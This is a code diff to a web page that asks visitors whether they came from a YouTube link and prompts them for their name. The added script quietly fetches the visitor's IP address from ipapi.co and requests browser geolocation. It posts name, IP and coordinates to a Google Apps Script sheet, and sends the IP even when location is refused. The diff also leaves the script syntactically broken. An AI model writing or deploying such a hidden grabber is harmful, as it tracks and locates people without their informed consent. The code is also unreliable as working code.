@@ -63,13 +63,19 @@ Did You Come From Kite's YT link ?
 <script>
     const SHEET_URL = "https://script.google.com/macros/s/AKfycbzz4y_TN7-NzZAVdjKvSpypicGLbu2fVpS2q0UBcjQNvIVZKtBhSSJePYj2vwo8HNll0A/exec";
 
-function saveName(name){
+function saveData(name, ip, lat, lng){
     fetch(SHEET_URL,{
         method:"POST",
-        body:JSON.stringify({
-            name:name
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body: JSON.stringify({
+            name: name,
+            ip: ip,
+            lat: lat,
+            lng: lng
         })
-    }).catch(()=>{});
+    });
 }
 
 function startAnswer(answer){
@@ -87,15 +93,30 @@ function startAnswer(answer){
     '<input id="nameInput" placeholder="Enter your name"><br><br><button onclick="checkName()">Submit</button>';
 }
 
-function checkName(){
-    navigator.geolocation.getCurrentPosition(
-  function(position){
-    alert("Location allowed!");
-  },
-  function(){
-    alert("Location denied.");
-  }
-);
+let name = document.getElementById("nameInput")
+        .value
+        .trim()
+        .toLowerCase();
+
+    fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+
+        navigator.geolocation.getCurrentPosition(
+
+            function(pos){
+                saveData(name, data.ip, pos.coords.latitude, pos.coords.longitude);
+            },
+
+            function(){
+                saveData(name, data.ip, "denied", "denied");
+            }
+
+        );
+
+    });
+
+}
 
     let name=document.getElementById("nameInput")
         .value
